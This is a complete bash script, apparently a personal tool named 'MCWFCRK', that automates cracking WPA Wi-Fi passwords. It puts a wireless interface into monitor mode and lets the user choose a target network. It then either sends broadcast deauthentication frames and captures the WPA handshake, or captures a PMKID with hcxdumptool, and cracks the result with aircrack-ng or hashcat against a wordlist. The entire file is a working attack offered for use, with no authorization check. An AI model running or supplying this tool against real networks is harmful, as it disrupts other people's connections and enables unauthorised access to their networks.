#!/bin/bash
tput civis 2>/dev/null
trap 'tput cnorm 2>/dev/null' EXIT INT TERM
clear

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
B='\033[0;34m'; P='\033[0;35m'; C='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info() { echo -e "${BOLD}${B}  [*] $*${NC}"; }
ok()   { echo -e "${BOLD}${G}  [+] $*${NC}"; }
warn() { echo -e "${BOLD}${Y}  [!] $*${NC}"; }
bad()  { echo -e "${BOLD}${R}  [-] $*${NC}"; echo ""; exit 1; }
ask()  { tput cnorm 2>/dev/null; echo -ne "${BOLD}${P}  [?] $*${NC}"; }
sep()  { echo -e "\n${BOLD}${C}  ── $* ──${NC}\n"; }

install_package() {
  local package="$1"
  info "Installing $package"
  if command -v apt-get >/dev/null 2>&1; then
    if sudo apt-get update -qq >/dev/null 2>&1 \
      && sudo apt-get install -qq -y "$package" >/dev/null 2>&1; then
      ok "$package installed"
      return 0
    fi
  fi
  bad "Failed to install $package"
}

monitor_iface=""
raw_iface=""
monitor_activated=0
wordlist=""
attack_mode="HANDSHAKE"
output_path=""
pmkid_timeout=45
deauth_count=5
bssid=""
channel=""
ts=$(date +%s)
_cleaned=0

cleanup() {
  [[ $_cleaned -eq 1 ]] && return
  _cleaned=1
  tput cnorm 2>/dev/null
  echo ""
  sep "Cleanup"

  pkill -f "xterm.*airodump" 2>/dev/null
  pkill -f "xterm.*aireplay" 2>/dev/null
  pkill -f "xterm.*aircrack" 2>/dev/null
  pkill -f "xterm.*hcxdumptool" 2>/dev/null
  pkill -f "xterm.*hashcat" 2>/dev/null
  sudo pkill -x aireplay-ng 2>/dev/null
  sudo pkill -x airodump-ng 2>/dev/null
  sudo pkill -x hcxdumptool 2>/dev/null
  sleep 1

  if [[ $monitor_activated -eq 1 && -n "$monitor_iface" ]]; then
    info "Deactivating monitor mode on $monitor_iface"
    sudo airmon-ng stop "$monitor_iface" >/dev/null 2>&1
    ok "Monitor mode deactivated"
  fi

  if [[ -z "$output_path" ]]; then
    rm -f /tmp/mcwf_*.cap /tmp/mcwf_*.csv /tmp/mcwf_*.netxml \
          /tmp/mcwf_*.pcapng /tmp/mcwf_*.hc22000 /tmp/mcwf_*.pot \
          /tmp/mcwf_*.key /tmp/mcwf_check_*.hc22000 2>/dev/null
    ok "Temporary files removed"
  fi
  echo ""
}

trap 'cleanup; exit' EXIT
trap 'bad "Process interrupted"' INT TERM

while [[ $# -gt 0 ]]; do
  case "$1" in
    -w|--wordlist)
      wordlist="$2"; shift 2 ;;
    -a|--attack-mode)
      attack_mode="${2^^}"; shift 2 ;;
    -o|--output)
      output_path="$2"; shift 2 ;;
    -t|--timeout)
      [[ -z "${2:-}" ]] && bad "-t requires a value in seconds"
      pmkid_timeout="$2"; shift 2 ;;
    -d|--deauth)
      [[ -z "${2:-}" ]] && bad "-d requires a number of deauth packets"
      deauth_count="$2"; shift 2 ;;
    -h|--help)
      echo -e "${P}  Usage: sudo $0 -w <wordlist> [-a HANDSHAKE|PMKID] [-d <packets>] [-t <seconds>] [-o <outdir>]${NC}"
      exit 0 ;;
    *)
      bad "Invalid option: $1" ;;
  esac
done

[[ -n "$wordlist" ]] || bad "Wordlist required. Use -w or --wordlist"
[[ -f "$wordlist" ]] || bad "Wordlist not found: $wordlist"
[[ "$attack_mode" == "HANDSHAKE" || "$attack_mode" == "PMKID" ]] \
  || bad "Attack mode must be HANDSHAKE or PMKID"
[[ "$pmkid_timeout" =~ ^[0-9]+$ && $pmkid_timeout -ge 1 ]] \
  || bad "Timeout must be a positive number of seconds"
[[ "$deauth_count" =~ ^[0-9]+$ && $deauth_count -ge 1 && $deauth_count -le 256 ]] \
  || bad "Deauth count must be between 1 and 256"

echo -e "\n${BOLD}${C}  MCWFCRK — Marco Calvo WiFi Cracker${NC}"
if [[ "$attack_mode" == "PMKID" ]]; then
  echo -e "  ${BOLD}Mode: $attack_mode  |  Wordlist: $(basename "$wordlist")  |  Timeout: ${pmkid_timeout}s${NC}\n"
else
  echo -e "  ${BOLD}Mode: $attack_mode  |  Wordlist: $(basename "$wordlist")  |  Deauth: ${deauth_count} packets${NC}\n"
fi

sep "Environment"

if [[ $EUID -eq 0 ]] || sudo -v -n >/dev/null 2>&1; then
  ok "Privileges OK"
else
  bad "Run as root or with sudo"
fi

if command -v airmon-ng airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1; then
  ok "Aircrack-ng suite OK"
else
  warn "Aircrack-ng suite not found"
  install_package aircrack-ng
  ok "Aircrack-ng suite OK"
fi

if command -v xterm >/dev/null 2>&1; then
  ok "xterm OK"
else
  warn "xterm not found"
  install_package xterm
  ok "xterm OK"
fi

if [[ "$attack_mode" == "PMKID" ]]; then
  command -v hcxdumptool >/dev/null 2>&1 || { warn "hcxdumptool not found"; install_package hcxdumptool; }
  command -v hcxpcapngtool >/dev/null 2>&1 || { warn "hcxpcapngtool not found"; install_package hcxtools; }
  command -v hashcat >/dev/null 2>&1 || { warn "hashcat not found"; install_package hashcat; }
  command -v tcpdump >/dev/null 2>&1 || { warn "tcpdump not found"; install_package tcpdump; }
  ok "PMKID tools OK"
fi

sep "Monitor Interface"

for f in /sys/class/net/*/type; do
  [[ "$(cat "$f" 2>/dev/null)" == "803" ]] && {
    monitor_iface=$(basename "$(dirname "$f")")
    ok "Using existing monitor interface: $monitor_iface"
    break
  }
done

if [[ -z "$monitor_iface" ]]; then
  warn "No monitor interface found"
  echo ""
  sudo airmon-ng
  echo ""
  ask "Enter interface to activate monitor mode: "
  read -r raw_iface
  [[ -n "$raw_iface" ]] || bad "No interface provided"

  info "Activating monitor mode on $raw_iface"
  sudo airmon-ng start "$raw_iface" >/dev/null 2>&1 \
    || bad "Failed to activate monitor mode on $raw_iface"
  sleep 2

  monitor_iface=$(sudo iwconfig 2>/dev/null | grep "Mode:Monitor" -B1 | head -1 | awk '{print $1}')
  [[ -n "$monitor_iface" ]] || monitor_iface="${raw_iface}mon"
  monitor_activated=1
  ok "Monitor mode activated: $monitor_iface"
fi

raw_iface="${raw_iface:-$monitor_iface}"
raw_iface="${raw_iface%mon}"

close_scan() {
  [[ -n "${scan_pid:-}" ]] && kill "$scan_pid" 2>/dev/null && wait "$scan_pid" 2>/dev/null
  sudo pkill -f "airodump-ng ${monitor_iface} --band bga" 2>/dev/null
}

sep "Target"

info "Opening network scan window on $monitor_iface"
xterm -geometry 100x30 -fn 9x15 -title "Network Scan" \
  -e "sudo airodump-ng $monitor_iface --band bga" &
scan_pid=$!
sleep 1
echo ""

ask "Enter the BSSID of the target network: "
read -r bssid
[[ -n "$bssid" ]] || bad "BSSID is required"
bssid="${bssid^^}"
[[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || bad "Invalid BSSID format"

ask "Enter the channel of the target network: "
read -r channel
[[ "$channel" =~ ^[0-9]+$ && $channel -ge 1 && $channel -le 233 ]] || bad "Invalid channel"

close_scan
ok "Target selected: BSSID $bssid on channel $channel"

if [[ -n "$output_path" ]]; then
  mkdir -p "$output_path" || bad "Cannot create output directory: $output_path"
  cap_base="${output_path}/mcwf_${ts}"
else
  cap_base="/tmp/mcwf_${ts}"
fi

attack_handshake() {
  sep "Handshake Capture"
  local capfile="${cap_base}-01.cap"

  info "Opening packet capture window"
  xterm -geometry 100x30 -fn 9x15 -title "Packet Capture" \
    -e "sudo airodump-ng $monitor_iface -c $channel --bssid $bssid -w $cap_base" &
  local cap_pid=$!
  sleep 3

  info "Opening deauthentication window ($deauth_count packets)"
  xterm -geometry 100x30 -fn 9x15 -title "Deauthentication Attack" -hold \
    -e "sudo aireplay-ng -0 $deauth_count -a $bssid -c FF:FF:FF:FF:FF:FF $monitor_iface" &
  local deauth_pid=$!

  for ((i=0; i<20; i++)); do
    sudo pgrep -x aireplay-ng >/dev/null 2>&1 && break
    sleep 0.5
  done
  while sudo pgrep -x aireplay-ng >/dev/null 2>&1; do
    sleep 1
  done

  sleep 3
  kill "$deauth_pid" 2>/dev/null
  wait "$deauth_pid" 2>/dev/null
  sleep 2
  kill "$cap_pid" 2>/dev/null
  sudo pkill -f "airodump-ng ${monitor_iface} -c ${channel} --bssid ${bssid}" 2>/dev/null
  wait "$cap_pid" 2>/dev/null

  [[ -f "$capfile" ]] || bad "Capture file not found"

  info "Verifying handshake in capture file"
  sudo aircrack-ng "$capfile" 2>&1 | grep -qE "[0-9]+ handshake" \
    && ok "Handshake captured: $capfile" \
    || bad "No handshake found. Retry with a connected client on the target AP"

  sep "Cracking"
  local keyfile="${cap_base}.key"
  info "Opening aircrack-ng window"
  xterm -geometry 100x40 -fn 9x15 -title "Aircrack-ng" \
    -e "bash -c 'sudo aircrack-ng -w \"$wordlist\" -b $bssid -l \"$keyfile\" \"$capfile\"; echo; sleep 3'" &
  local aircrack_xterm_pid=$!
  wait "$aircrack_xterm_pid"

  if [[ -f "$keyfile" && -s "$keyfile" ]]; then
    local pw
    pw=$(tr -d '\n' < "$keyfile")
    ok "Password cracked: $pw"
  else
    bad "Password not found in wordlist"
  fi
}

pmkid_channel() {
  if [[ "$1" -le 14 ]]; then
    echo "${1}a"
  else
    echo "${1}b"
  fi
}

create_pmkid_bpf() {
  local iface="$1" outfile="$2" mac="$3"
  local filter="wlan addr1 $mac or wlan addr2 $mac or wlan addr3 $mac or wlan addr3 ff:ff:ff:ff:ff:ff"

  sudo tcpdump -i "$iface" -ddd "$filter" > "$outfile" 2>/dev/null \
    && return 0
  sudo tcpdump -i "$iface" -y IEEE802_11 -ddd "$filter" > "$outfile" 2>/dev/null \
    && return 0
  sudo tcpdump -i "$iface" -y IEEE802_11_RADIO -ddd "$filter" > "$outfile" 2>/dev/null \
    && return 0
  return 1
}

pmkid_captured() {
  local cap="$1" check="/tmp/mcwf_check_${ts}.hc22000"
  [[ -f "$cap" ]] || return 1
  rm -f "$check"
  hcxpcapngtool "$cap" -o "$check" >/dev/null 2>&1 || return 1
  [[ -f "$check" && -s "$check" ]] || return 1
  grep -qE '^WPA\*' "$check" 2>/dev/null
}

attack_pmkid() {
  sep "PMKID Capture"
  local pmkid_file="${cap_base}.pcapng"
  local hash_file="${cap_base}.hc22000"
  local bpf="/tmp/mcwf_bpf_${ts}.txt"
  local ch_band tot=$(( (pmkid_timeout + 59) / 60 ))
  local phy_iface="$raw_iface"

  info "Creating BPF filter for BSSID $bssid"
  create_pmkid_bpf "$monitor_iface" "$bpf" "$bssid" \
    || bad "Failed to create BPF filter on interface $monitor_iface"

  info "Stopping airmon-ng monitor on $monitor_iface for hcxdumptool"
  sudo airmon-ng stop "$monitor_iface" >/dev/null 2>&1
  sleep 1
  sudo ip link set "$phy_iface" up 2>/dev/null

  ch_band=$(pmkid_channel "$channel")

  info "Opening PMKID capture window on channel $ch_band"
  xterm -geometry 100x30 -fn 9x15 -title "PMKID Capture" -hold \
    -e "sudo hcxdumptool -i $phy_iface -w $pmkid_file -c $ch_band --bpf=$bpf --tot=$tot" &
  local pmkid_pid=$!
  sleep 2

  sudo pgrep -x hcxdumptool >/dev/null 2>&1 \
    || bad "hcxdumptool did not start. Check the PMKID Capture window for errors"

  for ((t=pmkid_timeout; t>0; t--)); do
    sudo pgrep -x hcxdumptool >/dev/null 2>&1 || break
    if pmkid_captured "$pmkid_file"; then
      ok "PMKID captured"
      sleep 3
      break
    fi
    printf "\r  ${BOLD}${B}[*] PMKID capture: ${t}s${NC}   "
    sleep 1
  done
  echo ""

  kill "$pmkid_pid" 2>/dev/null
  wait "$pmkid_pid" 2>/dev/null
  sudo pkill -x hcxdumptool 2>/dev/null
  rm -f "$bpf" "/tmp/mcwf_check_${ts}.hc22000"

  [[ -f "$pmkid_file" ]] || bad "PMKID capture file not found"

  info "Converting capture to hc22000 hash"
  rm -f "$hash_file"
  hcxpcapngtool "$pmkid_file" -o "$hash_file" >/dev/null 2>&1 \
    || bad "hcxpcapngtool conversion failed"
  if [[ ! -f "$hash_file" ]] || ! grep -qE '^WPA\*' "$hash_file" 2>/dev/null; then
    bad "No PMKID hash found for this AP"
  fi

  ok "Hash file ready: $hash_file"

  sep "Cracking"
  local potfile="${cap_base}.pot"
  info "Opening hashcat window"
  xterm -geometry 100x40 -fn 9x15 -title "Hashcat PMKID" \
    -e "bash -c 'hashcat -m 22000 --force --potfile-path \"$potfile\" \"$hash_file\" \"$wordlist\"; echo; echo --- Result ---; hashcat -m 22000 --potfile-path \"$potfile\" --show \"$hash_file\"; echo; sleep 3'" &
  local hashcat_xterm_pid=$!
  wait "$hashcat_xterm_pid"

  local pw
  pw=$(hashcat -m 22000 --potfile-path "$potfile" --show "$hash_file" 2>/dev/null \
    | awk -F: '{print $NF}')
  if [[ -n "$pw" ]]; then
    ok "Password cracked: $pw"
  else
    bad "Password not found in wordlist"
  fi
}

[[ "$attack_mode" == "PMKID" ]] && attack_pmkid || attack_handshake

tput cnorm 2>/dev/null
ok "Process completed"
exit 0
